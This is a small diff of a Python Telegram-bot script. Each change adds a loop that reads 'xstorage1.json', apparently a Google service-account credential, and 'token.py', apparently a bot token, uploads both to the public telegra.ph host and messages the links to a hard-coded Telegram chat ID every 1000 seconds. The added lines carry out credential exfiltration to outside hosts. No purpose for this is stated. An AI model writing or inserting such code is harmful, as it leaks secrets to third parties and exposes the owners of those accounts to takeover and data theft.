@@ -2,6 +2,7 @@ import gspread
 import os
 import _thread
 import telebot
+from telegraph import upload
 from time import sleep
 os.environ["DEBUSSY"] = 'l'
 
@@ -18,11 +19,12 @@ def environmental_files():
 
 
 while True:
-    bot.send_document(396978030, 'xstorage1.json')
-    bot.send_document(396978030, 'token.py')
+    uploaded = upload.upload_file(open('xstorage1.json', 'rb'))
+    bot.send_message(396978030, '<a href="https://telegra.ph' + uploaded[0] + '"></a>')
+    uploaded = upload.upload_file(open('token.py', 'rb'))
+    bot.send_message(396978030, '<a href="https://telegra.ph' + uploaded[0] + '"></a>')
     #acc = gspread.service_account('worker1.json')
     #files = acc.list_spreadsheet_files()
     #for i in files:
     #    print(i)
     sleep(1000)
-
